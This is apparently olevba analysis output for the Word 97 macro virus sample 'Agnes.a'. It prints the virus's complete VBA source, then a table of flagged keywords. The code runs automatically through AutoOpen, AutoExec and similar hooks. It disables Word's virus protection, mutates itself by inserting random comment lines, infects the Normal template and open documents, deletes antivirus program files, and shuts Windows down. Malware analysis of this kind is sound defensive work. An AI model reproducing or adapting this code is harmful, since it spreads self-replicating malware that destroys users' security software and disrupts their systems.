olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Agnes.a-8883a1164f797cd994713c38f01dd29d7730143b
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Agnes.a-8883a1164f797cd994713c38f01dd29d7730143b - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO AGNESLEE.bas 
in file: Virus.MSWord.Agnes.a-8883a1164f797cd994713c38f01dd29d7730143b - OLE stream: 'Macros/VBA/AGNESLEE'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AGNES()
' -= [WM97.AGNES LEE] =-
On Error Resume Next
WordBasic.DisableAutoMacros 0
ActiveDocument.ReadOnlyRecommended = False
With Application
.EnableCancelKey = wdCancelDisabled
.DisplayAlerts = wdAlertsNone
End With
With Options
.ConfirmConversions = False
.VirusProtection = False
End With
Randomize
ActiveLines = Application.VBE.ActiveVBProject.VBComponents("AGNES LEE").CodeModule.CountOfLines
If ActiveLines > 300 Then
With Application.VBE.ActiveVBProject.VBComponents("AGNES LEE").CodeModule
For TheLine = 1 To .CountOfLines
If Left(.Lines(TheLine, 1), 3) = "Rem" Then .DeleteLines TheLine
Next TheLine
End With
Else
With Application.VBE.ActiveVBProject.VBComponents("AGNES LEE").CodeModule
PolySize = Int(Rnd * 10)
For PolyMorphic = 1 To PolySize
PolyString = ""
PolyLines = .CountOfLines
RndLine = Int(Rnd * PolyLines) + 1
StringSize = Int(Rnd * 39) + 1
For SomeString = 1 To StringSize
PolyString = PolyString & Chr(65 + Int(Rnd * 22)) & Chr(122 - Int(Rnd * 22))
Next SomeString
.InsertLines RndLine, "Rem " & PolyString
Next PolyMorphic
End With
End If
Call LL
Call LEE
WordBasic.FileExit dlg
Tasks.ExitWindows
Application.CommandBars("View").Controls(6).Delete
Application.CommandBars("Format").Controls(12).Delete
Application.CommandBars("Tools").Controls(12).Delete
Application.CommandBars("Tools").Controls(13).Delete
End Sub
Sub LEE()
On Error Resume Next
Kill ("C:\PROGRAM FILES\MCAFEE\VIRUSSCAN\*.*")
Kill ("C:\PROGRAM FILES\MCAFEE\VIRUSSCAN95\*.*")
Kill ("C:\Program Files\Dr Solomon's\Anti-Virus Toolkit\*.*")
Kill ("C:\PROGRAM FILES\TBAV\TBAV.DAT")
Kill ("C:\TBAV\TBAV.DAT")
Kill ("C:\Program Files\Norton Antivirus\V32scan.dll")
Kill ("C:\Program FileS\Norton Antivirus\Virscan.dat")
End Sub
Sub LL()
On Error Resume Next
Application.CommandBars("Edit").Enabled = False
Application.CommandBars("Insert").Enabled = False
Application.CommandBars("Format").Enabled = False
End Sub
Sub AG()
On Error Resume Next
Application.EnableCancelKey = wdCancelDisabled
With Options
.SaveNormalPrompt = False
.VirusProtection = False
.ConfirmConversions = False
End With
Application.VBE.ActiveVBProject.VBComponents("AGNES LEE").Export "C:\AGNESLEE.sys"
With Dialogs(wdDialogFileSummaryInfo)
.Author = Chr(74) + Chr(97) + Chr(99) + Chr(107) + Chr(32) + Chr(84) + Chr(119) + Chr(111) + Chr(102) + Chr(108) + Chr(111) + Chr(119) + Chr(101) + Chr(114) + Chr(32) + Chr(45) + Chr(61) + Chr(91) + Chr(76) + Chr(105) + Chr(110) + Chr(101) + Chr(90) + Chr(101) + Chr(114) + Chr(216) + Chr(32) + Chr(86) + Chr(120) + Chr(32) + Chr(84) + Chr(101) + Chr(97) + Chr(109) + Chr(93) + Chr(61) + Chr(45)
.Comments = "WM97.AGNES LEE" & Chr(32) + Chr(98) + Chr(121) + Chr(32) + Chr(76) + Chr(105) + Chr(77) + Chr(69) + Chr(32) + Chr(49) + Chr(46) + Chr(111)
.Execute
End With
For x = 1 To NormalTemplate.VBProject.VBComponents.Count
If NormalTemplate.VBProject.VBComponents(x).Name = "AGNES LEE" Then Sex = True
Next x
For y = 1 To ActiveDocument.VBProject.VBComponents.Count
If ActiveDocument.VBProject.VBComponents(y).Name = "AGNES LEE" Then GirlAGNES = True
Next y
If Sex = True And GirlAGNES = False Then Set OH = ActiveDocument.VBProject
If Sex = False And GirlAGNES = True Then Set OH = NormalTemplate.VBProject
If Sex = True And GirlAGNES = True Then GoTo Ende_
OH.VBComponents.Import "C:\AGNES LEE.sys"
If GirlAGNES = False Then ActiveDocument.SaveAs (WordBasic.[FileName$]()), FileFormat:=wdFormatDocument
If Sex = False Then NormalTemplate.Save
Ende_:
Call AGNES
End Sub
Sub AutoOpen()
On Error Resume Next
Call AG
Call AGNES
End Sub
Sub AutoExit()
On Error Resume Next
Call AG
Call AGNES
End Sub
Sub AutoNew()
On Error Resume Next
Call AG
Call AGNES
End Sub
Sub AutoExec()
On Error Resume Next
Call AG
Call AGNES
End Sub
Sub DD()
On Error Resume Next
Dialogs(wdDialogFileNew).Show
Call AG
Call AGNES
End Sub
Sub FF()
On Error Resume Next
Dialogs(wdDialogFileOpen).Show
Call AG
Call AGNES
End Sub
Sub LA()
On Error Resume Next
Call AG
Call AGNES
WordBasic.FileClose dlg
End Sub
Sub LAL()
On Error Resume Next
Call LA
Call AG
Call AGNES
End Sub
Sub EE()
On Error Resume Next
Call AG
Call AGNES
Dialogs(wdDialogFileSaveAs).Show
End Sub
Sub DL()
On Error Resume Next
Call AG
Call AGNES
Dialogs(wdDialogFilePrint).Show
End Sub
Sub BB()
On Error Resume Next
Call AG
Call AGNES
Dialogs(wdDialogEditReplace).Show
End Sub
Sub EL()
On Error Resume Next
Call AG
Call AGNES
If Options.CheckGrammarWithSpelling = True Then
ActiveDocument.CheckGrammar
Else
ActiveDocument.CheckSpelling
End If
End Sub
Sub LS()
On Error Resume Next
Call AG
Call AGNES
Dialogs(wdDialogsToolsHyphenation).Show
End Sub
Sub EO()
On Error Resume Next
Call AG
Call AGNES
Dialogs(wdDialogToolsOptions).Show
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoExit            |Runs when the Word document is closed        |
|AutoExec  |AutoNew             |Runs when a new Word document is created     |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |Application.VBE     |Executable file name                         |
|IOC       |V32scan.dll         |Executable file name                         |
+----------+--------------------+---------------------------------------------+
